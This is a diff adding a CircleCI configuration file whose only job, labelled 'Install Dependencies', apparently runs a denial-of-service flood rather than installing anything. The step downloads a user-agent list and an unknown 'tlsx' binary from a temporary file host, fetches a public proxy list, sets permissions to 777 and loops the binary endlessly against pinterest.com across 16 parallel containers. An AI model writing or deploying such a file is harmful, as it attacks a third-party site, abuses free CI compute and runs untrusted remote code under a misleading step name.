@@ -1,0 +1,16 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: debian:latest
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install curl -y && curl -O https://temp.sh/yihbM/ua.txt && curl -O https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt && curl -O https://temp.sh/nNrDy/tlsx && && chmod 777 * && while true; do ./tlsx https://www.pinterest.com/ 999999 36 100 http.txt ua.txt; done;
+            no_output_timeout: 5h
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
